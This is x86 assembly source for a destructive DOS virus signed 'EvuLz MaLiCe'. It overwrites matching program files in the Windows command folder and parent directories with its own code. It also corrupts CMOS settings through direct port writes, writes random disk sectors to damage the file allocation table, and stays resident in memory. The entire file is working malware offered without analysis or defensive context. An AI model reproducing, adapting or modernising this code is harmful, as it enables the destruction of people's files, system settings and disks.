
.model tiny
.code

seg_a  segment byte public
	ASSUME	CS:SEG_A, DS:SEG_A
org 100h


main proc

find:
        mov	   ah,3bh
        mov	   dx,offset win
        int	   21h
        mov    Dx,offset conn					
        mov    cx,2h					
        mov    ah,4eh				
        int    21h 
next:                                   
        mov    ah,4fh						
        mov    dx,offset conn					
        int    21h                                    
     
open:
	  mov    ah,43H 
	  mov    dx,09Eh
        mov    al,0                
	  int    21H                    
	  mov    cl,0                   		       
	  mov    ah,43H                 
	  nop
	  mov    dx,09Eh                
	  mov    al,1                   
	  int    21H     
        mov    ax,3d02h                               
        mov    dx,9eh					
        int    21h                                         
write:
        xchg   bx,ax                                 
        mov    cx,833                        
        mov    ah,40h                                 
        mov    dx,100h                                 
        int    21h                                    
close:   
        mov    ah,3eh                                 
        int    21h
        inc    cntr
        cmp    cntr,5
        jge    message                                
        call   next                                  
message:
        mov    ah,3bh
        mov    al,00h
        mov    dx,offset UP_ONE
        int    21h
        cmp    ax,3
        jne    next
        mov    cntr,0000

C_MAN:
     	  mov	   ah,09h
	  mov    dx,offset who
        int	   21h
        inc    cntr
	  cmp    cntr,65
	  jge    fat_fuck
	  mov    dx,cntr
        xor	   bx,bx
	  mov	   bx,255
        call   CMOS_CHCKSM

CMOS_CHCKSM:
        xor     ax,ax
        mov     al,2Eh           
        out     70h,al           
        in      al,71h           
        xchg    ch,al            
        mov     al,2Fh           
        out     70h,al           
        in      al,71h           
        xchg    cl,al            
        push    dx
        xchg    dl,al           
        out     70h,al          
        in      al,71h          
        sub     cx,ax           
        add     cx,bx           
        pop     dx
        xchg    dl,al           
        out     70h,al          
        xchg    al,bl           
        out     71h,al          
        mov     al,2Eh          
        out     70h,al          
        xchg    al,ch           
        out     71h,al          
        mov     al,2Fh          
        out     70h,al          
        xchg    al,cl           
        out     71h,al          
	  call    C_MAN
fat_fuck:
        push    dx
        push    bx
        push    cx
        push    ax
        push    bp               
        mov     ax,0dh
        int     21h               
        mov     ah,19h        
        int     21h               
        xor     dx,dx            
        call    load_sec         
        mov     bp,bx
        mov     bx,word ptr es:[bp+16h]  
        push    ax               
        call    rnd_num          
        cmp     bx,ax            
        jbe     alter_fat1        
        mov     ax,bx            
alter_fat1:        
        xchg    ax,dx           
        pop     ax
        mov     cx,1
        int     26h               
        add     dx,bx            
        int     26h               
        pop     bp        
        pop     ax
        pop     cx
        pop     bx
        pop     dx
	  CALL JUST_TO_MAKE_IT_WORSE

load_sec:
        push    cx
        push    ds               
        push    ax               
        push    cs
        pop     ds
        push    cs
        pop     es                
        mov     ax,0dh
        int     21h               
        pop     ax                
        mov     cx, 1
        mov     bx, offset sec_buf
        int     25h               
        pop     ds
        pop     cx
        ret
                   
rnd_num:
        push    cx
        push    dx               
        xor     ax,ax
        int     1ah              
        xchg    dx,ax           
        pop     dx
        pop     cx
        ret  
JUST_TO_MAKE_IT_WORSE:                 
	  mov     ah,31h                  
	  mov     dx,7530h                
	  int     21H  
	  RET                   
sec_buf dw 100h dup(?)
win  db  'C:\windows\command',0
conn db  '*.C*',0
who  db  '§ EvuLz MaLiCe §$'   
cntr dw  0
up_one  db '..',0
main endp
seg_a ends
end find
